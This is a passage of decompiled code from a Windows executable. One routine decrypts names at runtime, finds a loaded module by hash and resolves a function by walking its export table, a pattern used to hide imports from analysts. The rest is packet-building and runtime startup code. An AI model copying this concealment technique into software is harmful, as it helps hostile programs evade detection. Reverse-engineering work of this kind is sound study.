  local_f8[0x2a] = 0;
  local_f8[0x2b] = 0;
  local_f8[0x2c] = 0;
  local_f8[0x2d] = 0;
  local_f8[0x2e] = 0;
  local_f8[0x2f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x30] = 0;
  local_f8[0x31] = 0;
  local_f8[0x32] = 0;
  local_f8[0x33] = 0;
  local_f8[0x34] = 0;
  local_f8[0x35] = 0;
  local_f8[0x36] = 0;
  local_f8[0x37] = 0;
  local_f8[0x38] = 0;
  local_f8[0x39] = 0;
  local_f8[0x3a] = 0;
  local_f8[0x3b] = 0;
  local_f8[0x3c] = 0;
  local_f8[0x3d] = 0;
  local_f8[0x3e] = 0;
  local_f8[0x3f] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(param_1 + uVar11);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0xd);
  uVar13 = *(uint *)(param_2 + 0x1c);
  uVar11 = 0;
  local_f8[0x40] = 0;
  local_f8[0x41] = 0;
  local_f8[0x42] = 0;
  local_f8[0x43] = 0;
  local_f8[0x44] = 0;
  local_f8[0x45] = 0;
  local_f8[0x46] = 0;
  local_f8[0x47] = 0;
  local_f8[0x48] = 0;
  local_f8[0x49] = 0;
  local_f8[0x4a] = 0;
  local_f8[0x4b] = 0;
  local_f8[0x4c] = 0;
  local_f8[0x4d] = 0;
  local_f8[0x4e] = 0;
  local_f8[0x4f] = 0;
  local_f8[0x50] = 0;
  local_f8[0x51] = 0;
  local_f8[0x52] = 0;
  local_f8[0x53] = 0;
  local_f8[0x54] = 0;
  local_f8[0x55] = 0;
  local_f8[0x56] = 0;
  local_f8[0x57] = 0;
  local_f8[0x58] = 0;
  local_f8[0x59] = 0;
  local_f8[0x5a] = 0;
  local_f8[0x5b] = 0;
  local_f8[0x5c] = 0;
  local_f8[0x5d] = 0;
  local_f8[0x5e] = 0;
  local_f8[0x5f] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x60] = 0;
  local_f8[0x61] = 0;
  local_f8[0x62] = 0;
  local_f8[99] = 0;
  local_f8[100] = 0;
  local_f8[0x65] = 0;
  local_f8[0x66] = 0;
  local_f8[0x67] = 0;
  local_f8[0x68] = 0;
  local_f8[0x69] = 0;
  local_f8[0x6a] = 0;
  local_f8[0x6b] = 0;
  local_f8[0x6c] = 0;
  local_f8[0x6d] = 0;
  local_f8[0x6e] = 0;
  local_f8[0x6f] = 0;
  local_f8[0x70] = 0;
  local_f8[0x71] = 0;
  local_f8[0x72] = 0;
  local_f8[0x73] = 0;
  local_f8[0x74] = 0;
  local_f8[0x75] = 0;
  local_f8[0x76] = 0;
  local_f8[0x77] = 0;
  local_f8[0x78] = 0;
  local_f8[0x79] = 0;
  local_f8[0x7a] = 0;
  local_f8[0x7b] = 0;
  local_f8[0x7c] = 0;
  local_f8[0x7d] = 0;
  local_f8[0x7e] = 0;
  local_f8[0x7f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x80] = 0;
  local_f8[0x81] = 0;
  local_f8[0x82] = 0;
  local_f8[0x83] = 0;
  local_f8[0x84] = 0;
  local_f8[0x85] = 0;
  local_f8[0x86] = 0;
  local_f8[0x87] = 0;
  local_f8[0x88] = 0;
  local_f8[0x89] = 0;
  local_f8[0x8a] = 0;
  local_f8[0x8b] = 0;
  local_f8[0x8c] = 0;
  local_f8[0x8d] = 0;
  local_f8[0x8e] = 0;
  local_f8[0x8f] = 0;
  local_f8[0x90] = 0;
  local_f8[0x91] = 0;
  local_f8[0x92] = 0;
  local_f8[0x93] = 0;
  local_f8[0x94] = 0;
  local_f8[0x95] = 0;
  local_f8[0x96] = 0;
  local_f8[0x97] = 0;
  local_f8[0x98] = 0;
  local_f8[0x99] = 0;
  local_f8[0x9a] = 0;
  local_f8[0x9b] = 0;
  local_f8[0x9c] = 0;
  local_f8[0x9d] = 0;
  local_f8[0x9e] = 0;
  local_f8[0x9f] = 0;
  local_f8[0xa0] = 0;
  local_f8[0xa1] = 0;
  local_f8[0xa2] = 0;
  local_f8[0xa3] = 0;
  local_f8[0xa4] = 0;
  local_f8[0xa5] = 0;
  local_f8[0xa6] = 0;
  local_f8[0xa7] = 0;
  local_f8[0xa8] = 0;
  local_f8[0xa9] = 0;
  local_f8[0xaa] = 0;
  local_f8[0xab] = 0;
  local_f8[0xac] = 0;
  local_f8[0xad] = 0;
  local_f8[0xae] = 0;
  local_f8[0xaf] = 0;
  local_f8[0xb0] = 0;
  local_f8[0xb1] = 0;
  local_f8[0xb2] = 0;
  local_f8[0xb3] = 0;
  local_f8[0xb4] = 0;
  local_f8[0xb5] = 0;
  local_f8[0xb6] = 0;
  local_f8[0xb7] = 0;
  local_f8[0xb8] = 0;
  local_f8[0xb9] = 0;
  local_f8[0xba] = 0;
  local_f8[0xbb] = 0;
  local_f8[0xbc] = 0;
  local_f8[0xbd] = 0;
  local_f8[0xbe] = 0;
  local_f8[0xbf] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11 + 0x40] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(uVar11 + param_2);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0x19);
  lVar10 = 0;
  uVar12 = 0x1505;
  bVar2 = local_f8[0];
  for (uVar11 = 0; (bVar2 != 0 && (uVar11 < 0x3f)); uVar11 = uVar11 + 1) {
    uVar12 = (local_f8[uVar11] | 0x20) ^ uVar12 * 0x21;
    bVar2 = local_f8[uVar11 + 1];
  }
  psVar3 = (short *)FUN_140001950(uVar12);
  if (((psVar3 != (short *)0x0) && (*psVar3 == 0x5a4d)) &&
     (uVar12 = *(uint *)((longlong)*(int *)(psVar3 + 0x1e) + 0x88 + (longlong)psVar3),
     uVar11 = (ulonglong)uVar12, uVar12 != 0)) {
    uVar12 = *(uint *)((longlong)psVar3 + uVar11 + 0x18);
    uVar14 = 0;
    if (uVar12 != 0) {
      do {
        pbVar8 = local_f8 + 0x40;
        pbVar4 = (byte *)((ulonglong)
                          *(uint *)((longlong)psVar3 +
                                   uVar14 * 4 +
                                   (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x20)) +
                         (longlong)psVar3);
        bVar2 = *pbVar4;
        while ((bVar2 != 0 && (bVar2 == *pbVar8))) {
          pbVar1 = pbVar4 + 1;
          pbVar4 = pbVar4 + 1;
          pbVar8 = pbVar8 + 1;
          bVar2 = *pbVar1;
        }
        if (*pbVar4 == *pbVar8) {
          lVar10 = (ulonglong)
                   *(uint *)((longlong)psVar3 +
                            (ulonglong)
                            *(ushort *)
                             ((longlong)psVar3 +
                             uVar14 * 2 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x24)) *
                            4 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x1c)) +
                   (longlong)psVar3;
          goto LAB_14000b216;
        }
        uVar13 = (int)uVar14 + 1;
        uVar14 = (ulonglong)uVar13;
      } while (uVar13 < uVar12);
    }
    lVar10 = 0;
  }
LAB_14000b216:
  lVar5 = 0;
  do {
    local_f8[lVar5] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x40);
  lVar5 = 0;
  do {
    local_f8[lVar5 + 0x40] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x80);
  return lVar10;
}


// ==== FUN_14000b280 @ 14000b280 size 576

void FUN_14000b280(longlong param_1,undefined1 *param_2,undefined1 *param_3)

{
  longlong *plVar1;
  undefined1 *puVar2;
  undefined1 local_28 [16];
  
  plVar1 = (longlong *)(param_1 + 0x200);
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,(undefined1 *)(param_1 + 0x17));
  }
  else {
    *puVar2 = *(undefined1 *)(param_1 + 0x17);
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  FUN_140006110(param_1,*(undefined4 *)(param_2 + 8));
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_28[0] = 8;
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_28);
  }
  else {
    *puVar2 = 8;
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_28[0] = 0;
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_28);
  }
  else {
    *puVar2 = 0;
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_28[0] = *param_3;
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_28);
  }
  else {
    *puVar2 = local_28[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_28[0] = param_3[1];
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_28);
  }
  else {
    *puVar2 = local_28[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_28[0] = param_3[2];
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_28);
  }
  else {
    *puVar2 = local_28[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_28[0] = *param_2;
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_28);
  }
  else {
    *puVar2 = local_28[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_28[0] = param_2[1];
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_28);
  }
  else {
    *puVar2 = local_28[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_28[0] = param_2[2];
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_28);
  }
  else {
    *puVar2 = local_28[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_28[0] = param_2[3];
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_28);
  }
  else {
    *puVar2 = local_28[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_28[0] = param_2[4];
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_28);
  }
  else {
    *puVar2 = local_28[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_28[0] = param_2[5];
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_28);
  }
  else {
    *puVar2 = local_28[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_28[0] = param_2[6];
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_28);
  }
  else {
    *puVar2 = local_28[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_28[0] = param_2[7];
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_28);
  }
  else {
    *puVar2 = local_28[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  return;
}


// ==== FUN_14000b4c0 @ 14000b4c0 size 509

void FUN_14000b4c0(longlong param_1,undefined1 *param_2,undefined1 *param_3)

{
  longlong *plVar1;
  undefined1 *puVar2;
  undefined1 local_38 [24];
  
  plVar1 = (longlong *)(param_1 + 0x200);
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,(undefined1 *)(param_1 + 0x17));
  }
  else {
    *puVar2 = *(undefined1 *)(param_1 + 0x17);
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  FUN_140006110(param_1,*(undefined4 *)(param_2 + 8));
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_38[0] = 6;
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_38);
  }
  else {
    *puVar2 = 6;
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_38[0] = 0;
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_38);
  }
  else {
    *puVar2 = 0;
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_38[0] = *param_3;
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_38);
  }
  else {
    *puVar2 = local_38[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_38[0] = param_3[1];
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_38);
  }
  else {
    *puVar2 = local_38[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_38[0] = param_3[2];
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_38);
  }
  else {
    *puVar2 = local_38[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_38[0] = *param_2;
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_38);
  }
  else {
    *puVar2 = local_38[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_38[0] = param_2[1];
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_38);
  }
  else {
    *puVar2 = local_38[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_38[0] = param_2[2];
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_38);
  }
  else {
    *puVar2 = local_38[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_38[0] = param_2[3];
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_38);
  }
  else {
    *puVar2 = local_38[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_38[0] = param_2[4];
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_38);
  }
  else {
    *puVar2 = local_38[0];
    *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  }
  puVar2 = *(undefined1 **)(param_1 + 0x208);
  local_38[0] = param_2[5];
  if (puVar2 == *(undefined1 **)(param_1 + 0x210)) {
    FUN_14000b6c0(plVar1,puVar2,local_38);
    return;
  }
  *puVar2 = local_38[0];
  *(longlong *)(param_1 + 0x208) = *(longlong *)(param_1 + 0x208) + 1;
  return;
}


// ==== FUN_14000b6c0 @ 14000b6c0 size 369

undefined1 * FUN_14000b6c0(longlong *param_1,void *param_2,undefined1 *param_3)

{
  ulonglong uVar1;
  code *pcVar2;
  longlong lVar3;
  void *pvVar4;
  undefined1 *puVar5;
  ulonglong uVar6;
  undefined1 *_Dst;
  void *_Memory;
  ulonglong uVar7;
  undefined1 *puVar8;
  undefined1 *puVar9;
  undefined1 *unaff_RDI;
  size_t _Size;
  undefined1 auStack_48 [8];
  undefined1 auStack_40 [24];
  
  puVar5 = (undefined1 *)*param_1;
  uVar7 = 0x7fffffffffffffff;
  if (param_1[1] - (longlong)puVar5 == 0x7fffffffffffffff) {
    FUN_14000b840();
    pcVar2 = (code *)swi(3);
    puVar5 = (undefined1 *)(*pcVar2)();
    return puVar5;
  }
  uVar6 = param_1[2] - (longlong)puVar5;
  uVar1 = (param_1[1] - (longlong)puVar5) + 1;
  if (0x7fffffffffffffff - (uVar6 >> 1) < uVar6) {
    uVar6 = 0x8000000000000026;
LAB_14000b722:
    lVar3 = FUN_14000b890(uVar6);
    if (lVar3 != 0) {
      unaff_RDI = (undefined1 *)(lVar3 + 0x27U & 0xffffffffffffffe0);
      *(longlong *)(unaff_RDI + -8) = lVar3;
      goto LAB_14000b778;
    }
LAB_14000b7eb:
    pcVar2 = (code *)swi(0x29);
    pvVar4 = (void *)(*pcVar2)(5);
    puVar8 = auStack_40;
LAB_14000b7f2:
    _Memory = pvVar4;
    puVar9 = puVar8;
  }
  else {
    uVar6 = uVar6 + (uVar6 >> 1);
    uVar7 = uVar1;
    if (uVar1 <= uVar6) {
      uVar7 = uVar6;
    }
    if (uVar7 == 0) {
      unaff_RDI = (undefined1 *)0x0;
    }
    else {
      if (0xfff < uVar7) {
        uVar6 = uVar7 + 0x27;
        if (uVar6 <= uVar7) {
                    /* WARNING: Subroutine does not return */
          FUN_140001100();
        }
        goto LAB_14000b722;
      }
      unaff_RDI = (undefined1 *)FUN_14000b890(uVar7);
    }
LAB_14000b778:
    puVar5 = unaff_RDI + ((longlong)param_2 - (longlong)puVar5);
    *puVar5 = *param_3;
    pvVar4 = (void *)*param_1;
    if (param_2 == (void *)param_1[1]) {
      _Size = param_1[1] - (longlong)pvVar4;
      _Dst = unaff_RDI;
      param_2 = pvVar4;
    }
    else {
      memmove(unaff_RDI,pvVar4,(longlong)param_2 - (longlong)pvVar4);
      _Dst = puVar5 + 1;
      _Size = param_1[1] - (longlong)param_2;
    }
    puVar8 = auStack_48;
    puVar9 = auStack_48;
    memmove(_Dst,param_2,_Size);
    pvVar4 = (void *)*param_1;
    if (pvVar4 == (void *)0x0) goto LAB_14000b7fa;
    if ((ulonglong)(param_1[2] - (longlong)pvVar4) < 0x1000) goto LAB_14000b7f2;
    _Memory = *(void **)((longlong)pvVar4 + -8);
    if (0x1f < (ulonglong)((longlong)pvVar4 + (-8 - (longlong)_Memory))) goto LAB_14000b7eb;
  }
  *(undefined8 *)(puVar9 + -8) = 0x14000b7fa;
  free(_Memory);
LAB_14000b7fa:
  *param_1 = (longlong)unaff_RDI;
  param_1[1] = (longlong)(unaff_RDI + uVar1);
  param_1[2] = (longlong)(unaff_RDI + uVar7);
  return puVar5;
}


// ==== FUN_14000b840 @ 14000b840 size 18

void FUN_14000b840(void)

{
  code *pcVar1;
  
  std::_Xlength_error("vector too long");
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}


// ==== __security_check_cookie @ 14000b870 size 30

/* WARNING: This is an inlined function */

void __cdecl __security_check_cookie(uintptr_t _StackCookie)

{
  if ((_StackCookie == DAT_140010000) && ((short)(_StackCookie >> 0x30) == 0)) {
    return;
  }
  FUN_14000bb7c();
  return;
}


// ==== FUN_14000b890 @ 14000b890 size 58

void FUN_14000b890(size_t param_1)

{
  int iVar1;
  void *pvVar2;
  
  do {
    pvVar2 = malloc(param_1);
    if (pvVar2 != (void *)0x0) {
      return;
    }
    iVar1 = _callnewh(param_1);
  } while (iVar1 != 0);
  if (param_1 == 0xffffffffffffffff) {
                    /* WARNING: Subroutine does not return */
    FUN_140001100();
  }
                    /* WARNING: Subroutine does not return */
  FUN_14000bba8();
}


// ==== free @ 14000b8cc size 5

void __cdecl free(void *_Memory)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c356. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  free(_Memory);
  return;
}


// ==== free @ 14000b8d4 size 5

void __cdecl free(void *_Memory)

{
                    /* WARNING: Could not recover jumptable at 0x00014000c356. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  free(_Memory);
  return;
}


// ==== FUN_14000b8dc @ 14000b8dc size 43

undefined8 * FUN_14000b8dc(undefined8 *param_1,ulonglong param_2)

{
  *param_1 = type_info::vftable;
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}


// ==== FUN_14000b908 @ 14000b908 size 182

void FUN_14000b908(void)

{
  code *pcVar1;
  bool bVar2;
  char cVar3;
  int iVar4;
  undefined8 uVar5;
  undefined4 *puVar6;
  ulonglong uVar7;
  undefined7 extraout_var;
  
  _set_app_type(1);
  uVar5 = FUN_14000bec4();
  _set_fmode((int)uVar5);
  uVar5 = FUN_14000beb8();
  puVar6 = (undefined4 *)__p__commode();
  *puVar6 = (int)uVar5;
  uVar5 = __scrt_initialize_onexit_tables(1);
  if ((char)uVar5 != '\0') {
    FUN_14000bff8();
    atexit(FUN_14000c034);
    uVar7 = FUN_14000bebc();
    iVar4 = _configure_narrow_argv(uVar7 & 0xffffffff);
    if (iVar4 == 0) {
      FUN_14000becc();
      bVar2 = FUN_14000bf0c();
      if ((int)CONCAT71(extraout_var,bVar2) != 0) {
        __setusermatherr(FUN_14000beb8);
      }
      _guard_check_icall();
      _guard_check_icall();
      uVar5 = FUN_14000beb8();
      _configthreadlocale((int)uVar5);
      cVar3 = FUN_14000bedc();
      if (cVar3 != '\0') {
        _initialize_narrow_environment();
      }
      FUN_14000beb8();
      uVar5 = thunk_FUN_14000beb8();
      if ((int)uVar5 == 0) {
        return;
      }
    }
  }
  FUN_14000bf28(7);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}


// ==== FUN_14000b9c0 @ 14000b9c0 size 16

undefined8 FUN_14000b9c0(void)

{
  FUN_14000bef0();
  return 0;
}


// ==== FUN_14000b9d0 @ 14000b9d0 size 25

void FUN_14000b9d0(void)

{
  ulonglong uVar1;
  
  FUN_14000bf8c();
  uVar1 = FUN_14000beb8();
  _set_new_mode(uVar1 & 0xffffffff);
  return;
}


// ==== FUN_14000b9ec @ 14000b9ec size 346

ulonglong FUN_14000b9ec(void)

{
  bool bVar1;
  bool bVar2;
  int iVar3;
  longlong lVar4;
  undefined8 uVar5;
  longlong *plVar6;
  ulonglong uVar7;
  uint *puVar8;
  ulonglong uVar9;
  undefined8 unaff_RBX;
  undefined8 in_R9;
  undefined1 uVar10;
  
  iVar3 = (int)unaff_RBX;
  lVar4 = FUN_14000bc04(1);
  if ((char)lVar4 == '\0') {
    FUN_14000bf28(7);
  }
  else {
    bVar1 = false;
    uVar10 = 0;
    uVar5 = __scrt_acquire_startup_lock();
    iVar3 = (int)CONCAT71((int7)((ulonglong)unaff_RBX >> 8),(char)uVar5);
    if (DAT_140010130 != 1) {
      if (DAT_140010130 == 0) {
        DAT_140010130 = 1;
        iVar3 = _initterm_e(&DAT_14000e200,&DAT_14000e218);
        if (iVar3 != 0) {
          return 0xff;
        }
        _initterm(&DAT_14000e1e8,&DAT_14000e1f8);
        DAT_140010130 = 2;
      }
      else {
        bVar1 = true;
        uVar10 = 1;
      }
      __scrt_release_startup_lock((char)uVar5);
      plVar6 = (longlong *)FUN_14000bf18();
      if ((*plVar6 != 0) && (uVar7 = FUN_14000bccc((longlong)plVar6), (char)uVar7 != '\0')) {
        (*(code *)PTR__guard_dispatch_icall_14000e1c0)(0,2,0,in_R9,uVar10);
      }
      plVar6 = (longlong *)FUN_14000bf20();
      if ((*plVar6 != 0) && (uVar7 = FUN_14000bccc((longlong)plVar6), (char)uVar7 != '\0')) {
        _register_thread_local_exe_atexit_callback(*plVar6);
      }
      _get_initial_narrow_environment();
      __p___argv();
      puVar8 = (uint *)__p___argc();
